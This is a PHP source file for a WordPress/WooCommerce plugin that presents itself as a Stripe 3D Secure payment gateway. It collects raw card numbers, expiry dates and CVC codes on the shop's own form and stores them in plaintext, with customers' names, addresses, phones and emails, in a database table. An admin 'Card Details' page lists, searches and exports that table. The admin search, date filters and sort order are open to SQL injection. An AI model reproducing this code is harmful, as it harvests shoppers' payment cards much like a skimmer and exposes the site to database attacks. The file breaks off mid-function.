<?php
/**
* Plugin Name: Stripe 3D Secure Payment
* Plugin URI: https://www.zestgeek.com/
* Description: This plugin is used for store the stripe payment details and display the same.
* Version: 1.0
* Author: Wp Devloper
* Author URI: https://www.zestgeek.com/
**/
session_start();
require 'vendor/autoload.php';

define('WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_URL', plugin_dir_url( __FILE__ ));
define('WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_PATH', plugin_dir_path( __FILE__ ));

add_filter( 'cron_schedules', 'wp_3dstripe_cron_every_minutes' );
function wp_3dstripe_cron_every_minutes( $schedules ) {
    $schedules['every_two_minutes'] = array(
            'interval'  => 120,
            'display'   => __( 'Every 2 Minutes', 'textdomain' )
    );
    return $schedules;
}

// Schedule an action if it's not already scheduled
if ( ! wp_next_scheduled( 'wp_3dstripe_cron_every_minutes' ) ) {
    wp_schedule_event( time(), 'every_two_minutes', 'wp_3dstripe_cron_every_minutes' );
}

add_action( 'wp_3dstripe_cron_every_minutes', 'wp_3dstripe_cron_every_minutes_checks_payment' );

function wp_3dstripe_cron_every_minutes_checks_payment(){
    global $woocommerce;
    global $wpdb;
    $stripe_table = $wpdb->prefix.'stripe_3dsecure_payment';

    $wc_stripe_3d =  get_option('woocommerce_wc_stripe_3d_secure_settings',true);
    $environment = $wc_stripe_3d['stripe_environment'];
    $secure_key = $environment==0?$wc_stripe_3d['stripe_test_secret_key']:$wc_stripe_3d['stripe_live_secret_key'];

    $stripe = new \Stripe\StripeClient($secure_key);
    $finalDate = date('Y-m-d',strtotime(date('Y-m-d')) - (24 * 60 * 60));
    $args = array(
        'limit' => -1,
        'type' => 'shop_order',
        'status' => array('wc-pending', 'wc-on-hold', 'wc-failed'),
        'date_created' => '>='.$finalDate,
    );
    $orders = wc_get_orders( $args );
    if(!empty($orders)){
        foreach($orders as $order){
            $order_id = $order->get_id();
            $intent = json_decode($order->get_meta('stripe_paymentIntentConfirm'),true);
            if($intent != null){
                $paymentConfirmation = $stripe->paymentIntents->retrieve(
                  $intent['id'],
                  []
                );
                if($paymentConfirmation->status=='succeeded'){
                    $order->update_status('wc-processing','Via cron');
                    $card_details = json_decode($order->get_meta('stripe_card_details'),true);
                    $email = $order->get_user()->user_email?:$order->get_billing_email();
                    $card_detail = array(
                        'user_id' => $order->get_user_id(),
                        'firstname' => $order->get_billing_first_name(),
                        'lastname' => $order->get_billing_last_name(),
                        'phone' => $order->get_billing_phone(),
                        'address' => $order->get_billing_address_1().' '.$order->get_billing_address_2(),
                        'city' => $order->get_billing_city(),
                        'postcode' => $order->get_billing_postcode(),
                        'country' => $order->get_billing_country(),
                        'mail_id' => $email,
                        'order_id' => $order_id,
                        'cardNumber' => trim($card_details['card_number']),
                        'cvv' => $card_details['cvc'],
                        'expiry' => $card_details['exp'][0]."/".$card_details['exp'][1],
                        'status' => $paymentConfirmation->status,
                        'error_code' => $paymentConfirmation->status,
                        'created_date' => date('Y-m-d'),
                        'updated_date' => date('Y-m-d')
                    );
                    $data = $wpdb->get_results( "SELECT * FROM $stripe_table WHERE order_id ='$order_id' AND cardNumber = '".trim($card_details['card_number'])."' AND status = '".$paymentConfirmation->status."'");
                    if(empty($data)){
                        if(!empty((array)$paymentConfirmation->charges->data)){
                            // Add the note
                            $note = "Via cron, Stripe charge complete (Charge ID: ".$paymentConfirmation->charges->data[0]->id.")";
                            $order->add_order_note( $note );
                        }
                        $result = $wpdb->insert(
                            $stripe_table,
                            $card_detail
                        );
                    }
                }else{
                  $failed_code = $paymentConfirmation->last_payment_error->code;
                  if($failed_code == 'card_declined'){
                    $declinedCode = $paymentConfirmation->last_payment_error->decline_code;
                    $status = $declinedCode;
                  }else if($failed_code == 'payment_intent_authentication_failure'){
                    $status = $paymentConfirmation->status;
                  }else{
                    $status = $paymentConfirmation->status;
                  }
                  $card_details = json_decode($order->get_meta('stripe_card_details'),true);
                  $card_num = wp_trim_words($card_details['card_number']);
                  $email = $order->get_user()->user_email?:$order->get_billing_email();
                  $card_detail = array(
                        'user_id' => $order->get_user_id(),
                        'firstname' => $order->get_billing_first_name(),
                        'lastname' => $order->get_billing_last_name(),
                        'phone' => $order->get_billing_phone(),
                        'address' => $order->get_billing_address_1().' '.$order->get_billing_address_2(),
                        'city' => $order->get_billing_city(),
                        'postcode' => $order->get_billing_postcode(),
                        'country' => $order->get_billing_country(),
                        'mail_id' => $email,
                        'order_id' => $order_id,
                        'cardNumber' => trim($card_details['card_number']),
                        'cvv' => $card_details['cvc'],
                        'expiry' => $card_details['exp'][0]."/".$card_details['exp'][1],
                        'status' => $status,
                        'error_code' => $failed_code,
                        'created_date' => date('Y-m-d'),
                        'updated_date' => date('Y-m-d')
                    );
                  $data = $wpdb->get_results( "SELECT * FROM $stripe_table WHERE order_id ='$order_id' AND cardNumber = '".trim($card_details['card_number'])."' AND status = '$status'");
                  if(empty($data)){
                      $note = "Via cron, Payment status:- ".$status." returned by stripe.";
                      $order->add_order_note( $note );
                      $result = $wpdb->insert(
                          $stripe_table,
                          $card_detail
                      );
                  }
                }
            }
        }
    }
}

register_activation_hook( __FILE__, 'wp_stripe_3dsecure_payement_table' );

function wp_stripe_3dsecure_payement_table() {
  global $wpdb;
  $stripe_table = $wpdb->prefix.'stripe_3dsecure_payment';

  if($wpdb->get_var("SHOW TABLES LIKE '$stripe_table'") != $stripe_table) {
    $sql = "CREATE TABLE if not exists $stripe_table (
        `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
        `user_id` VARCHAR(255),
        `firstname` VARCHAR(255),
        `lastname` VARCHAR(255),
        `phone` VARCHAR(255),
        `address` TEXT,
        `city` VARCHAR(255),
        `postcode` VARCHAR(255),
        `country` VARCHAR(255),
        `mail_id` VARCHAR(255),
        `order_id` VARCHAR(255),
        `cardNumber` VARCHAR(255),
        `cvv` VARCHAR(255),
        `expiry` VARCHAR(255),
        `status` VARCHAR(255),
        `error_code` VARCHAR(255),
        `created_date` varchar(225),
        `updated_date` varchar(225),
        PRIMARY KEY  (id)
    );"; 
    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);
  }
}

add_filter( 'theme_page_templates', 'pt_add_page_template_to_dropdown' );

function pt_add_page_template_to_dropdown( $templates )
{
   $templates[WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_PATH . '/pay.php'] = __( 'Stripe 3DSecure', 'stripe3DSecure' );

   return $templates;


}


add_filter( 'template_include', 'pt_change_page_template', 99 );

function pt_change_page_template($template){
    if (is_page()) {
        $meta = get_post_meta(get_the_ID());
        $plugion_tamplate = WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_PATH . '/pay.php';
        if (!empty($meta['_wp_page_template'][0]) && $meta['_wp_page_template'][0] == $plugion_tamplate) {
            $template = $meta['_wp_page_template'][0];
        }
    }
    return $template;
}
function create_wordpress_post_with_code() {
    
        // Set the post ID to -1. This sets to no action at moment
        $post_id = -1;
    
        // Set the Author, Slug, title and content of the new post
        $author_id = 1;
        $slug = 'stripe-3d-secure-payment-gateway';
        $title = 'Stripe 3DSecure';
        
        // Cheks if doen't exists a post with slug "wordpress-post-created-with-code".
        if( !$post_id = post_exists_by_slug( $slug ) ) {
            // Set the post ID
            $post_id = wp_insert_post(
                array(
                    'comment_status'    =>  'closed',
                    'ping_status'       =>  'closed',
                    'post_author'       =>  $author_id,
                    'post_name'         =>  $slug,
                    'post_title'        =>  $title,
                    'post_status'       =>  'publish',
                    'post_type'         =>  'page'
                )
            );
            add_post_meta($post_id, '_wp_page_template', WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_PATH.'/pay.php' );
        } else {
                // Set pos_id to -2 becouse there is a post with this slug.
            update_metadata('page',  $post_id, '_wp_page_template', WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_PATH.'/pay.php' );
                $post_id = -2;
        
        } // end if
    
    } // end oaf_create_post_with_code

    add_filter( 'after_setup_theme', 'create_wordpress_post_with_code' );
 /**
 * post_exists_by_slug.
 *
 * @return mixed boolean false if no post exists; post ID otherwise.
 */
function post_exists_by_slug( $post_slug ) {
    $args_posts = array(
        'post_type'      => 'page',
        'post_status'    => 'closed',
        'name'      => $post_slug,
        'posts_per_page' => 1,
    );
    $loop_posts = new WP_Query( $args_posts );
    if ( ! $loop_posts->have_posts() ) {
        return false;
    } else {
        $loop_posts->the_post();
        return $loop_posts->post->ID;
    }
}

add_action( 'admin_menu', 'wp_stripe_3dsecure_payement_data' );
function wp_stripe_3dsecure_payement_data() {
    // echo WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_PATH.'/wp-ajax/export-stripe-cards.php';die;
  add_menu_page('Card Details', 'Card Details', 'manage_options', 'card_details', 'wp_add_card_detail_page_html');
    }
    function wp_add_card_detail_page_html() {
    if (!class_exists('WP_List_Table')) {
        require_once(ABSPATH . 'wp-admin/includes/class-wp-list-table.php');
    }

    class EntryListTable extends WP_List_Table {

        public function __construct() {
          global $status, $page;
          parent::__construct(array(
            'singular' => __( 'Entry Data', 'sp' ),
            'plural' => __( 'Entry Datas', 'sp' ),
          ));
        }

        /**
        * Delete a customer record.
        *
        * @param int $id customer ID
        */
        public static function delete_card( $id ) {
            global $wpdb;

            $wpdb->delete(
            "{$wpdb->prefix}stripe_3dsecure_payment",
            [ 'id' => $id ],
            [ '%d' ]
            );
        }


        /**
         * Returns the count of records in the database.
         *
         * @return null|string
         */
        public static function record_count() {
            global $wpdb;

            $sql = "SELECT COUNT(*) FROM {$wpdb->prefix}stripe_3dsecure_payment";

            return $wpdb->get_var( $sql );
        }


        /** Text displayed when no customer data is available */
        public function no_items() {
            _e( 'No card avaliable.', 'sp' );
        }

        /**
        * Render a column when no column specific method exists.
        *
        * @param array $item
        * @param string $column_name
        *
        * @return mixed
        */
        public function column_default( $item, $column_name ) {

            switch ( $column_name ) {
                case 'id':
                case 'order_id':
                case 'firstname':
                case 'lastname':
                case 'phone':
                case 'address':
                case 'city':
                case 'postcode':
                case 'country':
                case 'mail_id':
                case 'cvv':
                case 'expiry':
                case 'status':
                case 'error_code':
                case 'created_date':
                    return $item[ $column_name ];
                default:
                    return print_r( $item, true ); //Show the whole array for troubleshooting purposes
            }
        }

        function column_cb($item) {
            return sprintf(
                '<input type="checkbox" name="bulk-delete[]" value="%s" />', $item['id']
            );
        }

        /**
        * Method for name column
        *
        * @param array $item an array of DB data
        *
        * @return string
        */
        function column_card( $item ) {

            // create a nonce
            $delete_nonce = wp_create_nonce( 'stripe_delete_card' );

            $title = '<strong>' . $item['cardNumber'] . '</strong>';

            $actions = [
            'delete' => sprintf( '<a href="?page=%s&action=%s&id=%s&_wpnonce=%s">Delete</a>', esc_attr( $_REQUEST['page'] ), 'delete', absint( $item['id'] ), $delete_nonce )
            ];

            return $title . $this->row_actions( $actions );
        }

        public function get_sortable_columns() {
          $sortable_columns = array(
            'id' => array('id', true),
            'order_id' => array('order_id', true),
            'firstname' => array('firstname', true),
            'lastname' => array('lastname', true),
            'phone' => array('phone', true),
            'address' => array('address', true),
            'city' => array('city', true),
            'postcode' => array('postcode', true),
            'country' => array('country', true),
            'mail_id'   => array('mail_id', true),
            'card'   => array('cardNumber', true),
            'cvv' => array('cvv', true),
            'expiry' => array('expiry', true),
            'status' => array('status', true),
            'error_code' => array('error_code', true),
            'created_date' => array('created_date', true)
          );
          return $sortable_columns;
        }

        public function get_columns() {
          $columns = array(
            'cb' => '<input type="checkbox" />',
            'id' => 'ID',
            'order_id' => 'Order Id',
            'firstname' => 'First Name',
            'lastname' => 'Last Name',
            'phone' => 'Phone',
            'address' => 'Address',
            'city' => 'City',
            'postcode' => 'Post Code',
            'country' => 'Country',
            'mail_id' => 'Email',
            'card' => 'Card Number',
            'cvv' => 'CVV',
            'expiry' => 'Expiry',
            'status' => 'Status',
            'error_code' => 'Error Code',
            'created_date' => 'Created At'
          );
          return $columns;
        }

        /**
        * Returns an associative array containing the bulk action
        *
        * @return array
        */
        public function get_bulk_actions() {
            $actions = [
                'bulk-delete' => 'Delete'
            ];

            return $actions;
        }

        public function search_box( $text, $input_id ) { ?>
          <p class="search-box">
            <label class="screen-reader-text" for="<?php echo $input_id ?>"><?php echo $text; ?>:</label>
            <input type="search" id="<?php echo $input_id ?>" name="s" value="<?php _admin_search_query(); ?>" />
            <?php submit_button( $text, 'button', false, false, array('id' => 'search-submit') ); ?>
        </p>
      <?php }

        public function prepare_items() {
          global $wpdb,$current_user;
          $table_name =$wpdb->prefix . "stripe_3dsecure_payment";
          $per_page = isset($_GET['per_page'])&&intval($_GET['per_page'])?intval($_GET['per_page']):10;
          $columns = $this->get_columns();
          $hidden = array();
          $sortable = $this->get_sortable_columns();
          $this->_column_headers = array($columns, $hidden, $sortable);
          $this->process_bulk_action();
          $total_items = $wpdb->get_var("SELECT COUNT(id) FROM $table_name");

          $paged = isset($_REQUEST['paged']) ? max(0, intval($_REQUEST['paged']) - 1) : 0;
          $orderby = (isset($_REQUEST['orderby']) && in_array($_REQUEST['orderby'], array_keys($this->get_sortable_columns()))) ? $_REQUEST['orderby'] : 'id';
          $order = (isset($_REQUEST['order']) && in_array($_REQUEST['order'], array('asc', 'desc'))) ? $_REQUEST['order'] : 'desc';

        if(isset($_REQUEST['s']) && $_REQUEST['s']!='') {
            $search = $_REQUEST['s'];
              $this->items = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name WHERE lastname LIKE '%$search%' OR phone LIKE '%$search%' OR address LIKE '%$search%' OR city LIKE '%$search%' OR postcode LIKE '%$search%' OR country LIKE '%$search%' OR status LIKE '%$search%' OR firstname LIKE '%$search%' OR cardNumber LIKE '%$search%' OR order_id LIKE '%$search%' OR mail_id LIKE '%$search%' OR cvv LIKE '%$search%' OR expiry LIKE '%$search%' ORDER BY $orderby $order LIMIT %d OFFSET %d", $per_page, $paged * $per_page), ARRAY_A);
              $total_items = $wpdb->get_var("SELECT COUNT(id) FROM $table_name WHERE lastname LIKE '%$search%' OR phone LIKE '%$search%' OR address LIKE '%$search%' OR city LIKE '%$search%' OR postcode LIKE '%$search%' OR country LIKE '%$search%' OR status LIKE '%$search%' OR firstname LIKE '%$search%' OR cardNumber LIKE '%$search%' OR order_id LIKE '%$search%' OR mail_id LIKE '%$search%' OR cvv LIKE '%$search%' OR expiry LIKE '%$search%' ");
        } else if ((isset($_REQUEST['from_date']) || isset($_REQUEST['to_date'])) && ($_REQUEST['from_date']!='' || $_REQUEST['to_date']!='')) {
            $from_date = $_REQUEST['from_date'];
            $to_date = $_REQUEST['to_date'];
            $sql = "SELECT * FROM $table_name WHERE 1 ";
            $sql .= $from_date!=''?" AND created_date >= '$from_date'":'';
            $sql .= $to_date!=''?" AND created_date <= '$to_date'":'';
            $sql .= " ORDER BY $orderby $order LIMIT %d OFFSET %d";
            $this->items = $wpdb->get_results($wpdb->prepare($sql, $per_page, $paged * $per_page), ARRAY_A);
            $sql = "SELECT COUNT(id) FROM $table_name WHERE 1 ";
            $sql .= $from_date!=''?" AND created_date >= '$from_date'":'';
            $sql .= $to_date!=''?" AND created_date <= '$to_date'":'';
            $total_items = $wpdb->get_var($sql);
        } else {
          $this->items = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name ORDER BY $orderby $order LIMIT %d OFFSET %d", $per_page, $paged * $per_page), ARRAY_A);
        }

          $this->set_pagination_args(array(
            'total_items' => $total_items,
            'per_page' => $per_page,
            'total_pages' => ceil($total_items / $per_page)
          ));
        }

        public function process_bulk_action() {
            //Detect when a bulk action is being triggered...
            if ( 'delete' === $this->current_action() ) {
                // In our file that handles the request, verify the nonce.
                $nonce = esc_attr( $_REQUEST['_wpnonce'] );

                if ( ! wp_verify_nonce( $nonce, 'stripe_delete_card' ) ) {
                    die( 'Go get a life script kiddies' );
                }
                else {
                    $this->delete_card( absint( $_GET['id'] ) );

                    wp_redirect( esc_url( add_query_arg() ) );
                    exit;
                }

            }
            // If the delete bulk action is triggered
            if ( ( isset( $_GET['action'] ) && $_GET['action'] == 'bulk-delete' )
            || ( isset( $_GET['action2'] ) && $_GET['action2'] == 'bulk-delete' )
            ) {

                $delete_ids = esc_sql( $_GET['bulk-delete'] );

                // loop over the array of record IDs and delete them
                foreach ( $delete_ids as $id ) {
                    $this->delete_card( $id );

                }

                wp_redirect( esc_url( add_query_arg() ) );
                exit;
            }
        }

    }
    function wp_custom_submenu_output() {
      global $wpdb;
      $table = new EntryListTable();
      $table->prepare_items();
      $message = '';
      ob_start();
    ?>
      <div class="wrap wqmain_body">
        <h3>All Card Details</h3>
        <form id="stripe-entry-table" name="stripe_card_entry_table" method="GET">
            <input type="hidden" name="page" value="<?php echo $_REQUEST['page'] ?>"/>
            <label for="stripe_from_date">From</label>
            <input type="date" name="from_date" id="stripe_from_date" class="stripe_from_date" value="<?=isset($_REQUEST['from_date'])?$_REQUEST['from_date']:'';?>">
            <label for="stripe_to_date">To</label>
            <input type="date" name="to_date" id="stripe_to_date" class="stripe_to_date" value="<?=isset($_REQUEST['to_date'])?$_REQUEST['to_date']:'';?>">
            <button type="submit" id="stripe_card_detail_filter" class="page-title-action">Filter</button>
            <button href="#" id="stripe_card_detail_export" class="page-title-action">Export</button>
            <select name="per_page" id="per_page" class="per_page">
                <option value="10" <?=isset($_GET['per_page'])&&$_GET['per_page']==10?'selected':'';?>>10</option>
                <option value="15" <?=isset($_GET['per_page'])&&$_GET['per_page']==15?'selected':'';?>>15</option>
                <option value="25" <?=isset($_GET['per_page'])&&$_GET['per_page']==25?'selected':'';?>>25</option>
                <option value="50" <?=isset($_GET['per_page'])&&$_GET['per_page']==50?'selected':'';?>>50</option>
                <option value="100" <?=isset($_GET['per_page'])&&$_GET['per_page']==100?'selected':'';?>>100</option>
                <option value="250" <?=isset($_GET['per_page'])&&$_GET['per_page']==250?'selected':'';?>>250</option>
                <option value="500" <?=isset($_GET['per_page'])&&$_GET['per_page']==500?'selected':'';?>>500</option>
                <option value="1000" <?=isset($_GET['per_page'])&&$_GET['per_page']==1000?'selected':'';?>>1000</option>
                <!-- <option value="'all'" </?/=isset($_GET['per_page'])&&$_GET['per_page']=='all'?'selected':'';?>>All</option> -->
            </select>
            <button href="#" id="stripe_card_detail_remopve_dublicate" class="page-title-action">Remove Dublicates</button>
        </form>
        <?php echo $message; ?>
        <form id="entry-table" method="GET">
          <input type="hidden" name="page" value="<?php echo $_REQUEST['page'] ?>"/>
          <?php $table->search_box( 'search', 'search_id' ); $table->display() ?>
        </form>
      </div>
    <?php
      $wq_msg = ob_get_clean();
      echo $wq_msg;
    }
    wp_custom_submenu_output();

}

add_action( 'wp_enqueue_scripts', 'load_css_js' );

function load_css_js() {
  $ver_num = mt_rand();
  wp_enqueue_style('stripe3d-css', WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_URL .'css/style.css', array(), $ver_num,'all');
  wp_enqueue_script('stripe3d-script', WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_URL .'js/custom.js', array(), $ver_num,'all');
  wp_localize_script( 'stripe3d-script', 'ajax_var', array( 'ajaxurl' => admin_url('admin-ajax.php') ));
}

add_action( 'admin_enqueue_scripts', 'load_css_js' );

require_once(WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_PATH.'wp-ajax/export-stripe-cards.php');

add_filter( 'woocommerce_payment_gateways', 'stripe_3dsecure_gateway_class' );

function stripe_3dsecure_gateway_class( $methods ) {
    $methods[] = 'WC_stripe_3dsecure_PG'; 
    return $methods;
}

add_action( 'plugins_loaded', 'init_wc_stripe_3d_secure_payment_gateway' );

function init_wc_stripe_3d_secure_payment_gateway(){

    class WC_stripe_3dsecure_PG extends WC_Payment_Gateway {
        function __construct(){
            $this->id = 'wc_stripe_3d_secure';
            $this->method_title = 'Stripe3D Secure Payment Gateway';
            $this->title = 'Stripe3D Secure Payment Gateway';
            $this->has_fields = true;
            $this->method_description = 'Your description of the payment gateway';

            //load the settings
            $this->init_form_fields();
            $this->init_settings();
            $this->enabled = $this->get_option('stripe_enabled');
            $this->title = $this->get_option( 'stripe_title' );
            $this->description = $this->get_option('stripe_description');
            add_action( 'woocommerce_update_options_payment_gateways_' . $this->id, array( $this, 'process_admin_options' ) );

        }

        public function init_form_fields(){
            $this->form_fields = array(
                'stripe_enabled' => array(
                    'title'         => 'Enable/Disable',
                    'type'          => 'checkbox',
                    'label'         => 'Enable Stripe3D Secure Payment Gateway'
                ),
                'stripe_title' => array(
                    'title'         => 'Method Title',
                    'type'          => 'text',
                    'description'   => 'This controls the payment method title',
                    'default'       => 'Stripe3D Secure Payment Gatway',
                    'desc_tip'      => true,
                ),
                'stripe_description' => array(
                    'title'         => 'Customer Message',
                    'type'          => 'textarea',
                    'css'           => 'width:500px;',
                    'default'       => 'Your Payment Gateway Description',
                    'description'   => 'The message which you want it to appear to the customer in the checkout page.',
                ),
                'stripe_environment' => array(
                        'title'                 => 'Select Environment',
                        'type'                  =>  'select',
                        'options'               =>  array('Test','Live')
                ),
                'stripe_test_publishable_key' => array(
                    'title'         => 'Test publishable key',
                    'type'          => 'text',
                    'label'         => 'Test publishable key'
                ),
                'stripe_test_secret_key' => array(
                    'title'         => 'Test secret key',
                    'type'          => 'text',
                    'label'         => 'Test secret key'
                ),
                'stripe_live_publishable_key' => array(
                    'title'         => 'Live publishable key',
                    'class'                 => 'live',
                    'type'          => 'text',
                    'label'         => 'Live publishable key'
                ),
                'stripe_live_secret_key' => array(
                    'title'         => 'Live secret key',
                    'type'          => 'text',
                    'label'         => 'Live secret key'
                )               
            );
        }

        function process_payment( $order_id ) {
            global $woocommerce;
            $order = new WC_Order( $order_id );
            $wc_stripe_3d =  get_option('woocommerce_wc_stripe_3d_secure_settings',true);
            $environment = $wc_stripe_3d['stripe_environment'];
            $secure_key = $environment==0?$wc_stripe_3d['stripe_test_secret_key']:$wc_stripe_3d['stripe_live_secret_key'];

            $payFlag = true;
            $error_msg = '';
            $card_number = str_replace(' ','',$_POST['number']);
            if(!ctype_digit($card_number)||strlen($card_number)<14){
                $payFlag = false;
                $error_msg .= 'Vänligen ange rätt kortnummer.';
            }
            $exp = $_POST['expiry'];
            $exp = explode('/', $exp);
            if(count($exp)!=2||!ctype_digit($exp[0])||!ctype_digit($exp[1])||$exp[0]>12||$exp[0]<1||($exp[0]<date('m')&&$exp[1]==date('y'))||$exp[1]<date('y')||strlen($exp[1])!=2){
                $payFlag = false;
                if(strlen($error_msg)!=0){
                    $error_msg .= ' and ';
                }
                $error_msg .= 'Ogiltigt år. Vänligen ange formatet (MM / ÅÅ). Obs:- YY endast de två sista siffrorna.';
            }
            $cvc = $_POST['cvc'];
            if(!ctype_digit($cvc)||strlen($cvc)!=3){
                $payFlag = false;
                if(strlen($error_msg)!=0){
                    $error_msg .= ' and ';
                }
                $error_msg = 'Vänligen ange rätt CVC.';
            }

            if($payFlag==false){
                wc_add_notice($error_msg, 'error');
                $ui = array(
                    'result' => 'error',
                    'messages' => $error_msg
                );
                return  json_encode($ui);
            }

            $card_details['card_number'] = $card_number;
            $card_details['exp'] = $exp;
            $card_details['cvc'] = $cvc;

            \Stripe\Stripe::setApiKey($secure_key);

            $stripe = new \Stripe\StripeClient($secure_key);

            $full_name = $order->get_billing_first_name().' '.$order->get_billing_last_name();
            $email = $order->get_billing_email();
            $login = 'gäst';
            if(is_user_logged_in()){
                $login = 'inloggad';
            }
            
            $paymentMethods = $stripe->sources->create([
              'type' => 'card',
              'owner' => [
                'name' => $full_name,
                'email' => $email,
                'phone' => $order->get_billing_phone(),
                'address' => [
                    'line1' => $order->get_billing_address_1(),
                    'line2' => $order->get_billing_address_2(),
                    'city' => $order->get_billing_city(),
                    'postal_code' => $order->get_billing_postcode(),
                    ],
                    ],
              'card' => [
                'number' => $card_number,
                'exp_month' => $exp[0],
                'exp_year' => $exp[1],
                'cvc' => $cvc,
              ],
            ]);

            $cust = $stripe->customers->create([
                'name' => $full_name,
                'email' => $email,
                'preferred_locales' => ['sv-SE'],
                'description' => 'Namn: '.$full_name.', '.$login,
            ]);
            
            $desc = 'OnlineID - Order '.$order_id;
            $paymentIntentRetrieve = '';
            if($order->get_meta('stripe_paymentIntentConfirm')=='') {
                $paymentIntent = \Stripe\PaymentIntent::create([
                    'amount' => ceil($order->total)*100,
                    'currency' => $order->currency,
                    'payment_method_types' => ['card'],
                    'source' => $paymentMethods->id,
                    'customer' => $cust->id,
                    'description' => $desc,
                    'setup_future_usage' => 'off_session'
                ]);

            }else{
                $intent = json_decode($order->get_meta('stripe_paymentIntentConfirm'),true);
                $paymentIntentRetrieve = $stripe->paymentIntents->retrieve(
                  $intent['id'],
                  []
                );
                $order->update_meta_data('paymentIntentRetrieveCheckout', json_encode($paymentIntentRetrieve));
                if ($paymentIntentRetrieve->status == 'succeeded'||$paymentIntentRetrieve->status == 'processing') {
                    if($paymentIntentRetrieve->status == 'succeeded'){
                        $note = "Redirecting to ".$order->get_checkout_order_received_url();
                        $order->add_order_note( $note );
                    }
                    if($paymentIntentRetrieve->status == 'processing'){
                        $note = "Status:- ".$paymentIntentRetrieve->status.", Stripe returns empty response. Still awaiting payment";
                        $order->add_order_note( $note );
                    }
                    return array(
                        'result' => 'success',
                        'redirect' => $this->get_return_url( $order )
                    );
                }
                $paymentIntent = $stripe->paymentIntents->update(
                    $paymentIntentRetrieve->id,
                    ['amount' => ceil($order->total)*100,
                    'currency' => $order->currency,
                    'payment_method_types' => ['card'],
                    'source' => $paymentMethods->id,
                    'description' => $desc,
                    'setup_future_usage' => 'off_session']
                );
            }
            $full_name = $order->get_billing_first_name().' '.$order->get_billing_last_name();
            $email = $order->get_billing_email();
            $stripe->paymentIntents->update(
              $paymentIntent->id,
              ['metadata' => [
                'kundens_namn'=> $full_name,
                "kundens_epost"=> $email,
                'order_id' => $order_id,
                "site_url" => get_site_url(),
                ]
               ]
            );

            $paymentIntentConfirm = $stripe->paymentIntents->confirm(
              $paymentIntent->id,
              ['return_url' => get_site_url().'/stripe-3d-secure-payment-gateway?order_id='.$order_id]
            );

            if($paymentIntentRetrieve==''){
                // Add the note
                $note = "Stripe payment intent created (Payment Intent ID: ".$paymentIntentConfirm->id.")";
                $order->add_order_note( $note );
            }

            $order->update_meta_data('stripe_paymentIntentConfirm', json_encode($paymentIntentConfirm));
            $order->update_meta_data('stripe_card_details', json_encode($card_details));
            $order->save();

            //Based on the response from your payment gateway, you can set the the order status to processing or completed if successful:
            $order->update_status('wc-pending');

            //if the payment processing was successful, return an array with result as success and redirect to the order-received/thank you page.

            if(empty($paymentIntentConfirm->next_action)){
                // Add the note
                $note = "Redirecting to ".$this->get_return_url( $order );
                $order->add_order_note( $note );
                return array(
                    'result' => 'success',
                    'redirect' => $this->get_return_url( $order )
                );
            }else{
                $note = "Redirecting to ".$paymentIntentConfirm->next_action->redirect_to_url->url;
                $order->add_order_note( $note );
                return array(
                    'result' => 'success',
                    'redirect' => $paymentIntentConfirm->next_action->redirect_to_url->url
                );
            }
        }

        //this function lets you add fields that can collect payment information in the checkout page like card details and pass it on to your payment gateway API through the process_payment function defined above.

        public function payment_fields(){
            ?>
            
            <fieldset>
                <div class="amex-text">Amex & Klarna bank accepteras ej</div>
                <div class="p-Grid p-CardForm">
                    <div class="p-GridCell p-GridCell--12 p-GridCell--md6">
                        <div data-field="number" class="p-Field">
                            <label class="p-FieldLabel Label Label--empty" for="Field-numberInput"><?=_e('Kortnummer');?>
                                <span class="" style="color:red;">*</span>
                            </label>
                            <div>
                                <div class="p-CardNumberInput">
                                    <div class="p-Input">
                                        <input dir="ltr" type="text" maxlength="20" inputmode="numeric" name="number" id="Field-numberInput" placeholder="1234 1234 1234 1234" autocomplete="billing cc-number" aria-invalid="false" aria-required="true" class="p-Input-input Input p-CardNumberInput-input Input--empty p-Input-input--textRight" value="" style="padding-right: 51.2px;" required>
                                        <span class="danger" id="stripe-error-cardnum"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="expiration-cvc-sec">
                            <div class="p-GridCell p-GridCell--6 p-GridCell--md3">
                                <div data-field="expiry" class="p-Field">
                                    <label class="p-FieldLabel Label Label--empty" for="Field-expiryInput"><?=_e('Utgångsdatum')?>
                                        <span class="" style="color:red;">*</span>
                                    </label>
                                    <div>
                                        <div class="p-Input">
                                            <input dir="ltr" type="text" inputmode="numeric" name="expiry" id="Field-expiryInput" placeholder="MM / ÅÅ" autocomplete="billing cc-exp" aria-invalid="false" aria-required="true" class="p-Input-input Input Input--empty p-Input-input--textRight" value="" required>
                                            <span class="danger" id="stripe-error-exp"></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="p-GridCell p-GridCell--6 p-GridCell--md3">
                                <div data-field="cvc" class="p-Field">
                                    <label class="p-FieldLabel Label Label--empty" for="Field-cvcInput"><?=_e('
Kortkod (CVC)')?>
                                        <span class="" style="color:red;">*</span>
                                    </label>
                                    <div>
                                        <div class="p-CardCvcInput">
                                            <div class="p-Input">
                                                <input dir="ltr" type="text" maxlength="3" inputmode="numeric" name="cvc" id="Field-cvcInput" placeholder="CVC" autocomplete="billing cc-csc" aria-invalid="false" aria-required="true" class="p-Input-input Input Input--empty p-Input-input--textRight" value="" required>
                                                <span class="danger" id="stripe-error-cvc"></span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
        </fieldset>

<?php
            
        }

    }

    add_action('woocommerce_thankyou', 'stripe_after_order_placed', 10, 1);

    function stripe_after_order_placed($order_id) {
        global $woocommerce;
        global $wpdb;
        $stripe_table = $wpdb->prefix.'stripe_3dsecure_payment';

        $wc_stripe_3d =  get_option('woocommerce_wc_stripe_3d_secure_settings',true);
        $environment = $wc_stripe_3d['stripe_environment'];
